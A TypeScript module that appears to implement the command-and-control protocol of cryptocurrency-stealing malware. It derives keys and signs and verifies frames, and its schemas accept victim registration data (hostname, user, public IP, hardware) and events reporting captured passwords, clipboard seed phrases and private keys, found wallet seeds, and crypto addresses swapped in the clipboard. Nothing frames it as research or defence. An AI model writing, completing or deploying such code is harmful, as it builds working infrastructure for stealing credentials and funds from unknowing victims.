import { createHmac, hkdfSync, timingSafeEqual } from 'node:crypto';
import { z } from 'zod';

/** Wire constants of contract/v1/ws.md. */
export const MAX_FRAME = 262_144;
export const FRAME_LIMIT_PER_MIN = 240;
export const FRAME_BURST = 40;
export const HANDSHAKE_MS = 5_000;
export const PONG_DEADLINE_MS = 45_000;
export const DEDUP_WINDOW = 1024;
export const SKEW_SEC = 300;

const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;
const NONCE = /^[A-Za-z0-9_-]{22}$/;
const SIG = /^[A-Za-z0-9_-]{43}$/;
const MAX_SEQ = 9_007_199_254_740_991;

const uuid = z.string().regex(UUID);
const seq = z.number().int().min(1).max(MAX_SEQ);
const nonce = z.string().regex(NONCE);

/** Only `"` `\` and control chars are escaped; non-ASCII stays literal. */
export function escapeJson(value: string): string {
  return value.replace(/[\\"\u0000-\u001f]/g, (char) => {
    switch (char) {
      case '\\':
        return '\\\\';
      case '"':
        return '\\"';
      case '\b':
        return '\\b';
      case '\f':
        return '\\f';
      case '\n':
        return '\\n';
      case '\r':
        return '\\r';
      case '\t':
        return '\\t';
      default:
        return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
    }
  });
}

export type Keys = { c2a: Buffer; a2c: Buffer };

/** HKDF-SHA256 over the ticket secret, salted with the handshake nonce. */
export function deriveKeys(ticket: string, handshakeNonce: string): Keys {
  const secret = Buffer.from(ticket, 'base64url');
  const salt = Buffer.from(handshakeNonce, 'base64url');
  return {
    c2a: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/c2a'), 32)),
    a2c: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/a2c'), 32))
  };
}

function hmacInput(seqValue: number, nonceValue: string, payload: Buffer): Buffer {
  return Buffer.concat([Buffer.from(String(seqValue), 'ascii'), Buffer.from([0x1f]), Buffer.from(nonceValue, 'ascii'), Buffer.from([0x1f]), payload]);
}

export function sign(key: Buffer, seqValue: number, nonceValue: string, payload: Buffer): string {
  return createHmac('sha256', key).update(hmacInput(seqValue, nonceValue, payload)).digest('base64url');
}

function verify(key: Buffer, seqValue: number, nonceValue: string, payload: Buffer, signature: string): boolean {
  if (!SIG.test(signature)) return false;
  const expected = createHmac('sha256', key).update(hmacInput(seqValue, nonceValue, payload)).digest();
  const received = Buffer.from(signature, 'base64url');
  return received.length === expected.length && timingSafeEqual(expected, received);
}

export type Field = string | number | boolean | object;

/**
 * Concatenate in the fixed key order; `<fields>` go in schema order. The HMAC
 * covers the complete object text, so the signature is inserted before the
 * closing brace: `object` minus `}` + `,"sig":"…"}`.
 */
export function buildFrame(
  key: Buffer,
  base: { id: string; seq: number; ts: number; type: string; nonce: string },
  fields: Array<[string, Field]>
): string {
  let object = `{"v":1,"id":"${base.id}","seq":${base.seq},"ts":${base.ts},"type":"${base.type}","nonce":"${base.nonce}"`;
  for (const [name, value] of fields) {
    const rendered = typeof value === 'string'
      ? `"${escapeJson(value)}"`
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);
    object += `,"${name}":${rendered}`;
  }
  object += '}';
  const signature = sign(key, base.seq, base.nonce, Buffer.from(object, 'utf8'));
  return `${object.slice(0, -1)},"sig":"${signature}"}`;
}

export type Incoming = {
  /** Raw bytes before `,"sig":` (the closing brace is appended for the HMAC). */
  payload: Buffer;
  json: Record<string, unknown>;
  seq: number;
  nonce: string;
};

export type ParseFailure = { code: 4400 | 4401; reason: string; seq?: number; length: number };

/** Steps 1–4 of the receiver order. Everything after that is stateful. */
export function parseFrame(raw: Buffer): { ok: true; frame: Incoming } | { ok: false; failure: ParseFailure } {
  const length = raw.length;
  if (length > MAX_FRAME) return { ok: false, failure: { code: 4400, reason: 'frame_too_large', length } };
  if (length >= 3 && raw[0] === 0xef && raw[1] === 0xbb && raw[2] === 0xbf) {
    return { ok: false, failure: { code: 4400, reason: 'bom', length } };
  }
  let text: string;
  try {
    text = new TextDecoder('utf-8', { fatal: true }).decode(raw);
  } catch {
    return { ok: false, failure: { code: 4400, reason: 'utf8', length } };
  }
  let json: unknown;
  try {
    json = JSON.parse(text);
  } catch {
    return { ok: false, failure: { code: 4400, reason: 'json', length } };
  }
  if (!json || typeof json !== 'object' || Array.isArray(json)) {
    return { ok: false, failure: { code: 4400, reason: 'json', length } };
  }
  const frame = json as Record<string, unknown>;
  if (frame.v !== 1) return { ok: false, failure: { code: 4400, reason: 'version', length } };

  const seqValue = frame.seq;
  const nonceValue = frame.nonce;
  const signature = frame.sig;
  if (typeof seqValue !== 'number' || !Number.isSafeInteger(seqValue) || seqValue < 1
    || typeof nonceValue !== 'string' || !NONCE.test(nonceValue) || typeof signature !== 'string') {
    return { ok: false, failure: { code: 4401, reason: 'bad_hmac', seq: typeof seqValue === 'number' ? seqValue : undefined, length } };
  }
  const split = raw.lastIndexOf(',"sig":');
  if (split < 0) return { ok: false, failure: { code: 4401, reason: 'bad_hmac', seq: seqValue, length } };
  const payload = raw.subarray(0, split);
  return { ok: true, frame: { payload, json: frame, seq: seqValue, nonce: nonceValue } };
}

/** Step 4 against a concrete direction key. The signed text ends with `}`. */
export function checkHmac(key: Buffer, frame: Incoming): boolean {
  const signed = Buffer.concat([frame.payload, Buffer.from('}')]);
  return verify(key, frame.seq, frame.nonce, signed, String(frame.json.sig));
}

const baseShape = {
  v: z.literal(1),
  id: uuid,
  seq,
  ts: z.number().int().min(0),
  nonce,
  sig: z.string().regex(SIG)
};

const bodyShape = z.strictObject({
  status: z.enum(['ok', 'error', 'cancelled']),
  error: z.string().max(2000).nullish(),
  result: z.record(z.unknown()),
  artifacts: z.array(z.strictObject({ upload_request: uuid })).max(32).optional()
});

const eventData = z.discriminatedUnion('kind', [
  z.strictObject({ kind: z.literal('wallet_detected'), data: z.strictObject({ name: z.string().min(1).max(128), pid: z.number().int().min(1) }) }),
  z.strictObject({ kind: z.literal('wallet_closed'), data: z.strictObject({}) }),
  z.strictObject({ kind: z.literal('password'), data: z.strictObject({ process: z.string().max(260), title: z.string().max(512), text: z.string().min(1).max(4096) }) }),
  z.strictObject({
    kind: z.literal('clipboard_secret'),
    data: z.strictObject({
      kind: z.enum(['seed-12', 'seed-24', 'xprv', 'evm-key', 'solana-key', 'password']),
      value: z.string().min(1).max(4096),
      process: z.string().max(260).optional(),
      title: z.string().max(512).optional(),
      words: z.union([z.literal(12), z.literal(18), z.literal(24)]).optional()
    })
  }),
  z.strictObject({ kind: z.literal('clipboard_replace'), data: z.strictObject({ coin: z.string().min(1).max(16), original: z.string().min(1).max(256), replacement: z.string().min(1).max(256) }) }),
  z.strictObject({ kind: z.literal('seed_found'), data: z.strictObject({ words: z.union([z.literal(12), z.literal(18), z.literal(24)]), value: z.string().min(1).max(4096) }) })
]);

const inbound = {
  hello: z.strictObject({
    ...baseShape,
    type: z.literal('hello'),
    hostname: z.string().min(1).max(128),
    user: z.string().min(1).max(128),
    os: z.string().max(160),
    cpu: z.string().max(160),
    ram: z.string().max(64),
    gpu: z.string().max(160),
    resolution: z.string().max(64),
    java: z.string().max(64),
    agent: z.string().min(1).max(32),
    public_ip: z.string().min(1).max(64),
    path: z.string().min(1).max(1024),
    first: z.boolean(),
    expect_seq_in: z.number().int().min(0).max(MAX_SEQ)
  }),
  result: z.strictObject({ ...baseShape, type: z.literal('result'), reply_to: uuid, body: bodyShape }),
  event: z.strictObject({
    ...baseShape,
    type: z.literal('event'),
    kind: z.enum(['wallet_detected', 'wallet_closed', 'password', 'clipboard_secret', 'clipboard_replace', 'seed_found']),
    data: z.record(z.unknown()),
    legacy: z.string().max(4096)
  }),
  ack: z.strictObject({ ...baseShape, type: z.literal('ack'), reply_to: uuid }),
  ping: z.strictObject({ ...baseShape, type: z.literal('ping') }),
  bye: z.strictObject({
    ...baseShape,
    type: z.literal('bye'),
    code: z.union([z.literal(1000), z.literal(4400), z.literal(4401), z.literal(4403), z.literal(4408), z.literal(4409), z.literal(4429)]),
    reason: z.string().max(512)
  })
};

export type InboundType = keyof typeof inbound;

export function isInboundType(type: unknown): type is InboundType {
  return typeof type === 'string' && type in inbound;
}

/** Step 8: required fields and per-kind data. */
export function checkShape(frame: Record<string, unknown>): string | null {
  if (!isInboundType(frame.type)) return 'unknown_type';
  const parsed = inbound[frame.type].safeParse(frame);
  if (!parsed.success) return parsed.error.issues.map((issue) => issue.path.join('.') || 'frame').join(',');
  if (frame.type === 'event') {
    const event = eventData.safeParse({ kind: frame.kind, data: frame.data });
    if (!event.success) return event.error.issues.map((issue) => issue.path.join('.') || 'data').join(',');
  }
  return null;
}
